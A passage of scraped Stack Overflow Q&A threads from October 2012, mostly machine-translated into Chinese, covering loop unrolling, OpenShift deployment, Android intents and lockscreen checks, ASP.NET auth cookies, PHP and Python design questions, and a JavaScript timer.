With higher optimizations levels, it fully unrolls a loop that invokes an external function ten times. Presumably, it wouldn't do that unless it thought it was better. And it surely can't do that if the number of iterations is unknown.

Short answer: Fixed numbers of iterations give compilers more options. That should result in very slightly better code at least some of the time.

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-10-18T12:21:37.560

Indeed, it depends on the compiler. But effectively it allows the unrolling of loops. Here is an [Intel example](http://software.intel.com/sites/landingpage/opencl/optimization-guide/Note_on_Loops.htm) and a [AMD example](http://developer.amd.com/Resources/hc/OpenCLZone/programming/ImageConvolutionOpenCL/pages/ImageConvolutionUsingOpenCL_4.aspx).

With NVIDIA you need to had in your kernel: `#pragma OPENCL EXTENSION cl_nv_pragma_unroll : enable`.

So you can use a flag when you compiling, like: `-DITERATIONS=10`

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-10-18T12:07:41.353

You need to initialise `i`,

```
for (int i; i < ITERATIONS; i++){ 
```

is undefined behaviour and allows the compiler to entirely skip the loop ;)

Apart from that, if the number of iterations is known at compile time, the compiler can completely unroll the loop, for example, which can make a big difference (if the loop body is cheap).

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-10-18T12:09:07.250

This will depend a lot on the compiler and optimization settings you are using. Most likely, knowing the amount of loops will allow the compiler to unroll the loop and get rid of the branches and parameter i.

This is however completely compiler dependent, so don't count on it. But if you have a modern compiler, chances are big it will improve speed.

edit:

I read over the obvious uninitialized i, but you probably did too...

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-10-18T12:21:45.457

In the case of gcc-4.5.3, with `do_something() {printf("hello world")}`:

*   Without optimization or at `-O2`, the compiler does not unroll either loop.
*   At `-O4`, for the pre-known number of iterations only, the compiler unrolls the loop and inlines `do_something()`:

.

```
foo:
...
.L4:
        addl    $1, %ebx
        movl    $.LC0, 4(%esp)
        movl    $1, (%esp)
        call    __printf_chk
        cmpl    %ebx, %esi
        jg      .L4

main:
...
        pushl   %ebp
        movl    %esp, %ebp
        andl    $-16, %esp
        subl    $16, %esp
        movl    $.LC0, 4(%esp)
        movl    $1, (%esp)
        call    __printf_chk
        movl    $.LC0, 4(%esp)
        movl    $1, (%esp)
        call    __printf_chk
        movl    $.LC0, 4(%esp)
        movl    $1, (%esp)
        call    __printf_chk
... 
```

# openshift - 在 Openshift 中部署现有应用程序

> ID：12954161
> 
> 赞同：7
> 
> 时间：2012-10-18T12:03:43.837
> 
> 标签：openshift

我创建了一个 Web 应用程序，并且我喜欢在 Openshift 上进行部署。最简单的方法是什么？我正在使用 Openshift Eclipse 客户端。

我应该创建一个新的 openshift，然后从我现有的应用程序中复制所有文件，还是有一种更简单的方法可以将我现有的应用程序转换为 openshift 应用程序？

谢谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-06T01:12:01.633

如果您的应用程序是 Java EE Web 应用程序，请尝试以下操作：

*   [http://jaitechwriteups.blogspot.com.br/2011/08/deploy-java-ee-application-on-openshift.html](http://jaitechwriteups.blogspot.com.br/2011/08/deploy-java-ee-application-on-openshift.html)
*   [https://openshift.redhat.com/community/forums/express/how-can-i-deploy-a-war](https://openshift.redhat.com/community/forums/express/how-can-i-deploy-a-war)

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-11-03T09:21:03.177

我认为使用 OpenShift 的最佳方式是通过 rhc 命令行结合 git。设置完成后，您可以轻松地 git push 到 OpenShift 并使用操作挂钩控制应用程序的部署。查看带有 Python Django 应用程序的 OpenShift 示例：[https](https://github.com/openshift/django-example) ://github.com/openshift/django-example 和您可以在此处找到的操作挂钩：[https ://github.com/openshift/django-example/tree/master /.openshift/action_hooks](https://github.com/openshift/django-example/tree/master/.openshift/action_hooks)

根据您设置的应用程序类型，该过程可能会略有不同。[我建议在 OpenShift github https://github.com/openshift](https://github.com/openshift)上找到您正在构建的应用程序类型（Java、Python、Ruby 或 w/e）的 OpenShift 示例，按照他们的设置说明进行操作，然后移动你的代码到项目中。使用 rhc 命令行和 starter repos 来设置项目，可以快速为您提供基本的操作挂钩和 git 流。

如果您准备使用 Eclipse 客户端，请按照本指南进行部署：[https ://www.openshift.com/blogs/getting-started-with-eclipse-paas-integration](https://www.openshift.com/blogs/getting-started-with-eclipse-paas-integration)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-09T23:54:40.193

[看看这个视频](http://www.youtube.com/watch?v=4Htd9vAxJAc)，它向您展示了如何配置一个 openshift 项目（一个新的或现有的），然后为您的应用程序生成一个 ssh 密钥，您可以手动将 ssh 密钥复制/粘贴到 openshift 网站，或者eclipse插件就可以了。。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2015-06-04T10:23:57.760

您好以下是使用eclipse创建应用程序的步骤：

第 1 步：从以下 URL [http://download.jboss.org/jbosstools/updates/development/juno/下载 JBOSS 工具](http://download.jboss.org/jbosstools/updates/development/juno/) 第 2 步：注册 OpenShift 帐户 如果您还没有 OpenShift 帐户，请前往 openshift 网站并单击注册。它是完全免费的，红帽为每个用户提供三个免费的 Gears 来运行您的应用程序。在撰写本文时，为每个用户分配的组合资源为 1.5 GB 内存和 3 GB 磁盘空间。第 3 步：创建 SSH 密钥 下一步是创建 RSA 密钥以部署示例应用程序。要创建密钥，请按照以下步骤操作。1\. 访问菜单：Window> Preferences 2\. 在偏好窗口仍然打开的情况下，转到：General> Network Connection> SSH 3\. 单击 Tab Key Management，然后单击 Generate RSA Key ... 4\. 复制代码密钥 5.现在单击 Save Private Key ，然后单击 Ok 如下图所示

第 4 步：向 OpenShift 添加新的 SSH 密钥 创建 ssh 密钥后，下一步是将上一步生成的公钥上传到 OpenShift。转到 openshift 设置选项卡并添加新的 ssh 密钥，如下所示。您可以在用户主目录下的 .ssh 文件夹中找到公钥。该文件的名称为 id_rsa.pub。您可以添加多把钥匙，例如为办公室添加一把钥匙，为家里添加一把钥匙。

第 5 步：创建 OpenShift 帐户命名空间 每个帐户都需要有一个命名空间，该命名空间应仅对该帐户唯一。一个帐户只能有一个命名空间。命名空间是 OpenShift 分配给应用程序的 URL 的一部分。例如，如果您的应用程序名称是 calba1，命名空间是 backpain1，那么应用程序的 url 将是[http://xyz-abc.rhcloud.com](http://xyz-abc.rhcloud.com)。要创建命名空间，请访问[https://openshift.redhat.com/app/console/settings](https://openshift.redhat.com/app/console/settings)并在命名空间会话下输入命名空间。

第 6 步：创建 OpenShift 应用程序 创建命名空间后，我们就可以使用 JBoss Tools OpenShift 支持创建应用程序了。转到您的 Eclipse 并单击文件 > 新建 > 其他 > OpenShift 应用程序，如下所示，然后单击下一步。

按“下一步”后，系统将要求您提供在第 3 步中创建的 OpenShift 凭据。如果您尚未注册 OpenShift，可以单击向导上的在此处注册链接以创建您的 OpenShift 帐户。选中“保存密码”复选框，这样您就不必在每个命令中都输入密码，然后单击“下一步”。

接下来，您将被要求输入应用程序的详细信息，例如应用程序名称、应用程序类型、齿轮配置文件（您想要小型实例还是中型实例。对于 FreeShift 用户，您只能创建小型实例）、扩展的应用程序或非扩展应用程序，以及是否要嵌入任何或多个墨盒，如 mysql、postgresql、mongodb 等。我们将创建一个名为 springmvc3 的应用程序，类型为 jbosseap-6.0 并嵌入 postgresql-8.4 墨盒。

接下来，您将被要求配置您的项目和服务器适配器设置。选择默认值，然后单击下一步。

下一个屏幕将要求您指定要克隆 git 存储库的位置和 git 远程的名称。

最后按下完成按钮就完成了。这将为我们创建一个名为 gear 的应用程序容器，并设置所有必需的 SELinux 策略和 cgroup 配置。OpenShift 还将为您设置一个私有 git 存储库并将该存储库克隆到您的本地系统。接下来，OpenShift 会将 DNS 传播到外部世界。最后，该项目将被导入到您的 Eclipse 工作区中。将创建一个新项目。

第 6 步：将数据导出到云数据库 下载 RUBY 软件以从本地系统运行 openshift 命令。下载 ruby​​ 后，打开 ruby​​ 的命令提示符并运行以下命令 rhc setup 运行此命令后，请提供 openshift 凭据，如用户名和密码。此命令将从 Openshift 连接您。成功连接后，您需要转发系统上的端口，以便您可以从系统连接 Openshift 数据库。以下是端口转发的以下命令。rhc port-forward 运行此命令后，您可以从系统连接 Openshift 数据库。在 Openshift 数据库中运行数据库脚本，用于导出 Openshift 云数据库中的所有数据。完成数据库后，按 CTRL+C 终止连接。

第 7 步：更改数据库连接 通过 Openshift 数据库凭据更改应用程序中的数据库凭据。您可以检查您在 openshift 中创建的应用程序中的数据库凭据。

第 8 步：提交代码并推送到云端要提交代码，##右键单击项目>团队>提交。##接下来它会要求您输入提交消息，因此请输入任何逻辑消息。

第 9 步：运行您的应用程序 现在您已准备好运行您的应用程序。右键单击项目单击>运行方式>并选择要运行的openshift服务器。现在您的应用程序已经上线，您可以从任何地方访问它。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-08-08T00:05:30.847

Openshift Eclipse 插件负责创建 Openshift Gear、部署应用程序和添加您可能想要使用的任何墨盒的过程。因此，基本上您只需准备好您的 Openshift Online 凭据即可。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2016-08-13T01:09:34.180

您可以从 DockerHub 导入它。您可以使用以下命令从 DockerHub 安装应用程序：

`oc new-app docker.io/<repo>/<app-name>`

# android - 不能在覆盖类中使用 putExtra 方法

> ID：12954162
> 
> 赞同：2
> 
> 时间：2012-10-18T12:03:45.680
> 
> 标签：android, android-intent, itemizedoverlay

这是我的新 android 程序，它是一个自定义的覆盖类我无法使用 putExtra() 将参考值发送到下一个活动我可以成功运行这个项目它不会向下一个类方法发送任何值任何人都可以帮助我来修复这个错误

```
import java.util.ArrayList;
import android.app.Activity;
import android.app.AlertDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.graphics.drawable.Drawable;
import android.view.MotionEvent;
import com.google.android.maps.GeoPoint;
import com.google.android.maps.ItemizedOverlay;
import com.google.android.maps.MapView;
import com.google.android.maps.OverlayItem;

/**
 * Class used to place marker or any overlay items on Map
 * */
public class AddItemizedOverlay extends ItemizedOverlay<OverlayItem> {

       private ArrayList<OverlayItem> mapOverlays = new ArrayList<OverlayItem>();

       private Context context;
       String place_reference;
       private Activity activity;
       String reference;

       public AddItemizedOverlay(Drawable defaultMarker) {
            super(boundCenterBottom(defaultMarker));
       }

       public AddItemizedOverlay(Drawable defaultMarker, Context context) {
            this(defaultMarker);
            this.context = context;
       }

       @Override
       public boolean onTouchEvent(MotionEvent event, MapView mapView)
       {   

           if (event.getAction() == 1) {
               GeoPoint geopoint = mapView.getProjection().fromPixels(
                   (int) event.getX(),
                   (int) event.getY());
               // latitude
               double lat = geopoint.getLatitudeE6() / 1E6;
               // longitude
               double lon = geopoint.getLongitudeE6() / 1E6;
               //Toast.makeText(context, "Lat: " + lat + ", Lon: "+lon, Toast.LENGTH_SHORT).show();
           }
           return false;
       } 

       @Override
       protected OverlayItem createItem(int i) {
          return mapOverlays.get(i);
       }

       @Override
       public int size() {
          return mapOverlays.size();
       }

       public AddItemizedOverlay(Drawable defaultMarker, Context context, Activity a) {
            this(defaultMarker);
            this.context = context;
            this.activity = a;
        }

       @Override
       protected boolean onTap(int index) {
         OverlayItem item = mapOverlays.get(index);
         AlertDialog.Builder dialog = new AlertDialog.Builder(this.context);
         dialog.setTitle(item.getTitle());
         dialog.setMessage(item.getSnippet());
         reference = item.getSnippet();
         dialog.setPositiveButton("Yes", new DialogInterface.OnClickListener() {
            public void onClick(DialogInterface dialog, int which) {

//              Intent a = activity.getIntent();
//      String  reference=a.getStringExtra(place_reference);
                System.out.println("this is additemized :"+reference);
                Intent intent = new Intent(context, SinglePlaceActivity.class);
                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                intent.putExtra("KEY_REFERENCE",reference);
                context.startActivity(intent );
            }
         })
            .setNegativeButton("No",new DialogInterface.OnClickListener() {
                public void onClick(DialogInterface dialog,int id) {
                    // if this button is clicked, just close
                    // the dialog box and do nothing
                    dialog.cancel();
//                  MainActivity.this.finish();
                }
            });
         dialog.show();
         return true;
       }

       public void addOverlay(OverlayItem overlay) {
          mapOverlays.add(overlay);
       }

       public void populateNow(){
           this.populate();
       }

    } 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-18T12:24:15.223

开始活动前

```
SharedPreferences prefs = context.getSharedPreferences("myprefs", 0);
SharedPreferences.Editor editor =prefs.edit();
editor.putString("KEY_REFERENCE", reference);
editor.commit(); 
```

现在开始您的活动后，您可以访问它

```
SharedPreferences prefs = getSharedPreferences("myprefs", 0);
String reference=  prefs.getString("KEY_REFERENCE",""); 
```

# asp.net-mvc-3 - 如何找到新注册用户的 cookie 并在部分视图 mvc3 中使用它的值？

> ID：12954167
> 
> 赞同：0
> 
> 时间：2012-10-18T12:04:02.593
> 
> 标签：asp.net-mvc-3, cookies

我有两种方法：一种用于注册新用户**AddNewUser(MemberRegisterModel mm)**，另一种用于为他创建 cookie **CreateCookie(MemberLoginModel member)**。我想使用注册后创建的这个 cookie 来在所有页面的顶部显示用户名，直到他注销。

我跟踪了我的代码并看到创建了 cookie。**我在HeaderPartial.cshtml**中使用此代码从 cookie 中提供用户名。

```
<div id="top">
@if (HttpContext.Current.Response.Cookies[FormsAuthentication.FormsCookieName] != null)
  {
    HttpCookie cookie =
    HttpContext.Current.Request.Cookies.Get(FormsAuthentication.FormsCookieName);
    var formAuthTicket = FormsAuthentication.Decrypt(cookie.Value);
    string CookieValue = formAuthTicket.UserData.ToString();
    <text> welcome <b> @Html.Label(CookieValue)</b>! 
    [@Html.ActionLink("Log off", "logout", "Members", new { area = "Members" }, null)]
    </text>
}
else
{
 <text>Welcome Guest!</text>
    @:[ @Html.ActionLink("Log in", "Login", "Members", new { area = "Members" }, null)]

} 
```

但它不起作用并在这一行显示错误：

```
 var formAuthTicket = FormsAuthentication.Decrypt(cookie.Value); 
```

错误：

> “encryptedTicket”参数的值无效。

我该怎么办？我想在所有页面的顶部显示用户名，并在他的个人页面中显示所有用户名的 db 值。他将登录并浏览所有页面，直到他退出。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-18T12:10:35.407

如果您使用 FormsAuthentication 编写身份验证 cookie，则无需解密和读取原始 cookie 值。您可以`@User.Identity.Name`在您的视图中使用。

```
public ActionResult AddNewUser(MemberRegisterModel mm)
{
    ...
    FormsAuthentication.SetAuthCookie(mm.UserName, true || false);
    ...
    return Redirect("Index", "Home");
}

Hello, and welcome, <strong>@User.Identity.Name</strong> 
```

这就是 SetAuthCookie 内部的样子：

```
public static void SetAuthCookie(string userName, bool createPersistentCookie)
{
    FormsAuthentication.Initialize();
    FormsAuthentication.SetAuthCookie(userName, createPersistentCookie, 
        FormsAuthentication.FormsCookiePath);
}

public static void SetAuthCookie(string userName, bool createPersistentCookie, 
  string strCookiePath)
{
  FormsAuthentication.Initialize();
  HttpContext current = HttpContext.Current;
  if (!current.Request.IsSecureConnection && FormsAuthentication.RequireSSL)
    throw new HttpException(System.Web.SR.GetString("Connection_not_secure_creating_secure_cookie"));
  bool flag = CookielessHelperClass.UseCookieless(current, false, FormsAuthentication.CookieMode);
  HttpCookie authCookie = FormsAuthentication.GetAuthCookie(userName, createPersistentCookie, flag ? "/" : strCookiePath, !flag);
  if (!flag)
  {
    HttpContext.Current.Response.Cookies.Add(authCookie);
    current.CookielessHelper.SetCookieValue('F', (string) null);
  }
  else
    current.CookielessHelper.SetCookieValue('F', authCookie.Value);
}

private static HttpCookie GetAuthCookie(string userName, bool createPersistentCookie, string strCookiePath, bool hexEncodedTicket)
{
  FormsAuthentication.Initialize();
  if (userName == null)
    userName = string.Empty;
  if (strCookiePath == null || strCookiePath.Length < 1)
    strCookiePath = FormsAuthentication.FormsCookiePath;
  DateTime utcNow = DateTime.UtcNow;
  DateTime expirationUtc = utcNow.AddMinutes((double) FormsAuthentication._Timeout);
  FormsAuthenticationTicket ticket = FormsAuthenticationTicket.FromUtc(2, userName, utcNow, expirationUtc, createPersistentCookie, string.Empty, strCookiePath);
  string str = FormsAuthentication.Encrypt(ticket, hexEncodedTicket);
  if (str == null || str.Length < 1)
    throw new HttpException(System.Web.SR.GetString("Unable_to_encrypt_cookie_ticket"));
  HttpCookie httpCookie = new HttpCookie(FormsAuthentication.FormsCookieName, str);
  httpCookie.HttpOnly = true;
  httpCookie.Path = strCookiePath;
  httpCookie.Secure = FormsAuthentication._RequireSSL;
  if (FormsAuthentication._CookieDomain != null)
    httpCookie.Domain = FormsAuthentication._CookieDomain;
  if (ticket.IsPersistent)
    httpCookie.Expires = ticket.Expiration;
  return httpCookie;
} 
```

请注意，它实际上确实创建了一个表单身份验证票证并加密了 cookie，

# php - 显示表单提交的次数

> ID：12954171
> 
> 赞同：0
> 
> 时间：2012-10-18T12:04:13.230
> 
> 标签：php, database, wordpress, email, count

我有一个 wordpress 网站，在每个帖子上我都有一个 html 提交表单，可以通过电子邮件将用户信息发送给我。

1）我需要能够显示人们提交了多少次表单（即“xx人提交了这个表单”）

2）我需要将该号码存储在数据库中，并能够在一个页面上显示多个帖子的页面（例如搜索结果页面）上调用它 - 这样当显示多个帖子时，您仍然可以看到“ xx 人已在每个单独的帖子上提交了此表格。

希望这是有道理的。我知道这很复杂，而且我的 php 技能并不令人难以置信，因此任何代码片段都将不胜感激。

可以在此处找到我所追求的[屏幕截图：网站](http://www.samskirrow.com/yourdream_edits.jpg)的屏幕截图- 您可以看到表单位于“表达兴趣”下，并且只是一个提交按钮（数据在一些隐藏字段中）

谢谢，山姆

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-18T12:52:11.240

您应该真正考虑数据库中的自动增量 id 列。

[自增](http://dev.mysql.com/doc/refman/5.0/en/example-auto-increment.html)

作为替代方案，您可以使用 php 将数字写入文件...

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-18T12:39:00.947

简单的，

为提交的数字创建一个列。每次成功提交表单时，都会向该列添加 +1。

# android - 当屏幕在Android中被阻止？

> ID：12954174
> 
> 赞同：1
> 
> 时间：2012-10-18T12:04:26.873
> 
> 标签：android, screen, lockscreen, wakelock, android-wake-lock

有谁知道最简单的方法来确定设备的屏幕何时被阻止（未关闭）？

当通知可能包含私人信息但它们显示在被阻止的屏幕上时，这是必要的。我不想表现出来。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-18T12:09:59.487

```
if(isKeyboardLocked(context)){
// screen blocked
}

private boolean isKeyboardLocked(Context context) {
            KeyguardManager myKM = (KeyguardManager) context
                    .getSystemService(Context.KEYGUARD_SERVICE);
            return myKM.inKeyguardRestrictedInputMode();
        } 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-18T12:13:46.847

这是检查它的方法

```
KeyguardManager myKM = (KeyguardManager) context.getSystemService(Context.KEYGUARD_SERVICE);
if( myKM.inKeyguardRestrictedInputMode()) {
    //it is locked
} else {
 //it is not locked
} 
```

# java - Java Servlet 扩展另一个 Servlet

> ID：12954176
> 
> 赞同：1
> 
> 时间：2012-10-18T12:04:34.673
> 
> 标签：java, jakarta-ee, servlets

`init`我的大多数（所有）servlet 中的方法都是相似的。主要是初始化一个`DataSource`

我正在考虑创建一个`BaseServlet`具有受保护`DataSource`和`init`实现的方法以及所有其他 servlet 扩展它`BaseServlet`。

我应该警惕的任何陷阱？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-18T12:18:15.087

If you just need initialize the Database related stuff, you can put that into ServletContext, I am not a fun of so many class inheritance.

nowadays, seems we don't just start from servlet, why not choose a framework?

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-18T12:19:11.947

在当前的方法中：

1.  每个扩展的 Servlet`BaseServlet`都将创建自己的数据源，因为该`init()`方法将被多次调用。
2.  我认为这不是您想要完成的，您正在寻找一个用于所有 Servlet 的单一数据源。

假设上述情况属实，我建议以下

1.  将您的数据源包装在一个单例类中。这将确保数据源只初始化一次。使用[急切](http://en.wikipedia.org/wiki/Singleton_pattern#Eager_initialization)的初始化来确保数据源在类加载本身时被初始化
2.  使用此类获取 servlet 类中的数据源/连接。

# android - 在android中切换图像和视频

> ID：12954178
> 
> 赞同：1
> 
> 时间：2012-10-18T12:04:42.290
> 
> 标签：android

我想实现显示在android屏幕横向顶部滚动的图像和视频库的概念，并在选择一个图像或视频时，它会在下部显示为更大的图像。可以使用ImageSwitcher，但它仅适用于图像而不是视频，我想在图像和视频之间切换。

# python - 变数

> ID：12954179
> 
> 赞同：1
> 
> 时间：2012-10-18T12:04:52.900
> 
> 标签：python

我有一个愚蠢的问题：

有没有办法在另一个类中使用一个类的实例变量？我想继承可能是这样做的方法，但我不知道如何:(

例如：

```
class A():
    def __init__(self):
        self.var1 = 12
        self.var2 = C()

    def start(self):
        self.var1=11
        B()

class B():

    def doSomething(self):
        varXX = "  here I would like to have objet self.var2 from A()"         

class C():
    def makeUI(self):
        something 
```

谢谢帮助

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-18T12:20:05.317

```
class A():
    def __init__(self):
        self.var1 = 12
        self.var2 = C()

    def start(self):
        self.var1=11
        B(self)             # pass this instance into the initialisation of B

class B():
    def __init__(self, a):
        self.a = a          # save reference to the A() instance

    def doSomething(self):
        varXX = self.a.var2 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-18T12:24:53.697

有没有办法在另一个类中使用一个类的实例变量？不，你不能。实例变量是特定于对象的，而不是特定于类的。要么您需要访问该类的对象，要么您有设计问题。您可能需要将它们设为类变量。

如果这些变量不是特定于实例的，请将它们设为类变量并按如下方式访问

```
>>> class A():
    _init_done = False
    def __init__(self):
        if not A._init_done:
            A.var1 = 12
            A.var2 = C()
            A._init_done = True
def start(self):
    A.var1=11
    B()            
>>> class B():    
    def doSomething(self):
        print A.var1           
>>> class C():
    def makeUI(self):
        something            
>>> x = A()
>>> y = B()
>>> y.doSomething()
12
>>> x.start()
>>> y.doSomething()
11 
```

# php - PHP：用对象实现状态

> ID：12954180
> 
> 赞同：3
> 
> 时间：2012-10-18T12:04:52.870
> 
> 标签：php, oop

我对如何为对象实现状态感到两难。假设我们有这个：

```
class User {

     private $_active;// 1 or 0
     private $_deleted;// 1 or 0
     ...

} 
```

这些属性 - 正如我所看到的 - 暗示了用户对象的状态。我想做的是定义一些事件，如 afterActivate() 或 afterDelete() 以便我可以链接我的例程。即激活后更新一些计数器，删除后也更新一些计数器...

所以我目前正在考虑两种方法 - 第一种是创建 Activable 和 Deletable 类（不要介意命名），然后让 User 通过继承层次结构继承这些类。

```
class Activable {

    protected afterActivate(){};

}

class Deletable {

    protected afterDelete(){};
}

class Activable extends Deletable {}
class User extends Activable{} 
```

我看到这种方法有两个问题 - 第一个是 Activable 类现在隐含了错误的可删除状态，第二个问题是 - 如果我有更多状态 - 5-6 个状态，继承层次结构可能会变得非常复杂。（因为用户将扩展模型类，这将扩展其他东西等......）

第二种方法是在 PHP 中使用特征并使用它们来实现这一点。所以我会有类似的东西

```
class User{
    use Activable, Deletable; 

} 
```

什么方法会更好——也许是第三种方法？我在这里朝着正确的方向前进吗？

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-18T12:13:15.180

通常你会用[`Marker Interface`](http://en.wikipedia.org/wiki/Marker_interface_pattern)s 来做这种事情。
我想这是我们正在谈论的某种 ORM？比我还假设有某种对象处理您的实体的持久性。让该对象检查`$entity instanceof Deletable`并采取行动。

# android - 使用坐标在谷歌地图上查找位置

> ID：12954183
> 
> 赞同：1
> 
> 时间：2012-10-18T12:05:00.460
> 
> 标签：android, google-maps

我想根据纬度和经度坐标在地图上显示一个位置。当我按下一个按钮时，我想将坐标发送到谷歌地图（或其他应用程序）并精确定位该位置。关于我如何实现这一目标的任何想法？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-18T12:13:40.030

这是一个很好的例子：

[http://mobiforge.com/developing/story/using-google-maps-android](http://mobiforge.com/developing/story/using-google-maps-android)

[http://saigeethamn.blogspot.in/2009/10/google-maps-on-android-android.html](http://saigeethamn.blogspot.in/2009/10/google-maps-on-android-android.html)

希望这会帮助你..

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-18T12:20:26.533

如果你想动画到谷歌地图上的特定点，你需要定义一个 MapView。然后创建一个 MapController 并动画到一个特定的 GeoPoint：

```
MapController mapController = mapView.getController();

double lat = latitude * 1e6;
double lon = longitude * 1e6;

GeoPoint startpoint = new GeoPoint((int) lat, (int) lon);
mapController.animateTo(startpoint); 
```

试试这个教程：[MapView 教程](https://developers.google.com/maps/documentation/android/hello-mapview)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-18T12:59:25.037

我找到了一个简单的解决方案。我通过意图启动谷歌地图应用程序

```
Intent intent = new Intent(android.content.Intent.ACTION_VIEW, 
                        Uri.parse("http://maps.google.com/maps?q=" + serviceActivity.Latitude.toString() + "," + serviceActivity.Longitude.toString()));
                        startActivity(intent); 
```

# php - PHP 和 Javascript 倒计时

> ID：12954184
> 
> 赞同：5
> 
> 时间：2012-10-18T12:05:00.873
> 
> 标签：php, javascript, timer, counter

我正在尝试基于 PHP 变量编写一个 JS 计数计时器（只会计数到无穷大）。不幸的是，该变量是不可编辑的（一旦我得到它就可以对它做一些事情，但不能改变我得到的形式，因为它来自数据库软件写入，我不能改变软件）。我得到的只是秒数（用户访问的东西是多少秒前，等等），并且希望它以（X 天，X 小时，X 分钟，X 秒）的格式显示。

我已经有了计时器代码和 PHP 代码，但是问题是解决方案的最佳方法是什么。我是否尝试在 PHP 中将秒数转换为日期，然后让 JS 完成所有休息，或者我是否更改 JS 以便它接受秒数，然后进行倒计时。除了这个，我该怎么做？

我的柜台代码：

JS 在文档中，传入变量以便 PHP 可以轻松更改这些：

```
<script type="text/javascript" language="JavaScript">
    TargetDate = "09/21/2012 5:00";
    CountActive = true;
</script> 
```

然后（包括所有计数器代码）：

```
<script type="text/javascript"  language="JavaScript" src="js/time.js"></script> 
```

和上面提到的 .js 文件：

```
function calcage(secs, num1, num2) {
  s = ((Math.floor(secs/num1))%num2).toString();
  if (LeadingZero && s.length < 2)
    s = "0" + s;
  return  s;
}

function CountBack(secs) {
  if (secs < 0) {
    document.getElementById("cntdwn").innerHTML = FinishMessage;
    return;
  }
  DisplayStr = DisplayFormat.replace(/%%D%%/g, calcage(secs,86400,100000));
  DisplayStr = DisplayStr.replace(/%%H%%/g, calcage(secs,3600,24));
  DisplayStr = DisplayStr.replace(/%%M%%/g, calcage(secs,60,60));
  DisplayStr = DisplayStr.replace(/%%S%%/g, calcage(secs,1,60));

  document.getElementById("cntdwn").innerHTML = DisplayStr;
  if (CountActive)
    setTimeout("CountBack(" + (secs+CountStepper) + ")", SetTimeOutPeriod);
}

function putspan(backcolor, forecolor) {
 document.write("<span id='cntdwn'></span>");
}

if (typeof(BackColor)=="undefined")
  BackColor = "white";
if (typeof(ForeColor)=="undefined")
  ForeColor= "#2A8827";
if (typeof(TargetDate)=="undefined")
  TargetDate = "12/31/2020 5:00 AM";
if (typeof(DisplayFormat)=="undefined")
  DisplayFormat = "%%D%% days, %%H%% hours, %%M%% minutes, %%S%% seconds.";
if (typeof(CountActive)=="undefined")
  CountActive = true;
if (typeof(FinishMessage)=="undefined")
  FinishMessage = "no data";
if (typeof(CountStepper)!="number")
  CountStepper = +1;
if (typeof(LeadingZero)=="undefined")
  LeadingZero = true;

CountStepper = Math.ceil(CountStepper);
if (CountStepper == 0)
  CountActive = false;
var SetTimeOutPeriod = (Math.abs(CountStepper)-1)*1000 + 1000;
putspan(BackColor, ForeColor);
var dthen = new Date(TargetDate);
var dnow = new Date();
if(CountStepper>0)
  ddiff = new Date(dnow-dthen);
else
  ddiff = new Date(dthen-dnow);
gsecs = Math.floor(ddiff.valueOf()/1000);
CountBack(gsecs); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-18T14:44:17.740

正如评论中所建议的，我使用了 PHP。最终通过：

从 DB 中获取值并将其存储在 $uptime 内（以秒为单位）。

```
$uptime = (time() - $uptime);
$uptime = date("m/d/Y H:i:s",$uptime); 
```

然后我使用 date 函数更改它以适应 JS 代码并使用新的 $uptime 变量输出它：

```
<script type="text/javascript" language="JavaScript">
TargetDate = "<?php echo $uptime; ?>";
CountActive = true;
</script>
<script type="text/javascript"  language="JavaScript" src="js/time.js"></script> 
```

这确保日期以正确的格式输出，适合 JS。

# android - Android 完成取消操作栏

> ID：12954186
> 
> 赞同：3
> 
> 时间：2012-10-18T12:05:13.553
> 
> 标签：android, actionbarsherlock

有什么方法可以使用 actionbarsherlock 库创建像下面的屏幕一样的自定义操作栏

![在此处输入图像描述](../Images/cb9d409583a6b5a7d61ca21bf7a0caeb.png)

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-10-18T13:28:32.523

您应该能够通过`setCustomView()`. Roman Nurik 有[一篇关于实现 DONE+DISCARD 的方法的 G+ 帖子](https://plus.google.com/113735310430199015092/posts/R49wVvcDoEW)，并提供了[源代码](http://code.google.com/p/romannurik-code/source/browse/misc/donediscard)。虽然他的代码没有使用 ActionBarSherlock，但我怀疑它会移植过来。

但是，请记住，Android 2.x 上的按钮背景看起来与 3.0+ 上的略有不同，因此您可能需要做更多的工作才能使操作栏空间中的按钮看起来像您想要的那样。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-03-13T16:23:55.470

这是您在 xml 中的实际操作方式

***在 Honeycomb 及以上使用 Roman 的布局***

/layout-v11/actionbar_custom_view_done_discard.xml

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:divider="?android:attr/dividerVertical"
    android:dividerPadding="12dp"
    android:orientation="horizontal"
    android:showDividers="middle" >

    <include layout="@layout/actionbar_discard_button" />

